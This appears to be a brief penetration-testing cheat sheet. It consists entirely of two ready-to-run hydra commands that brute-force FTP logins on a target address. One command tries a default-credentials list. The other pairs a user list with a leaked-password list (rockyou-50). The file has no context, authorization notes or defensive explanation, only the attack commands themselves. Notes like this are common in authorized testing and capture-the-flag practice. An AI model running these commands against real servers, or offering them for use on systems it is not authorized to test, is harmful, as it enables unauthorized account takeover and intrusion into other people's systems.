# hydra bruteforce ftp

## default creds
```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $IP ftp
```

## rockyou 50
```bash
hydra -L users -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt -e nsr $IP ftp
```
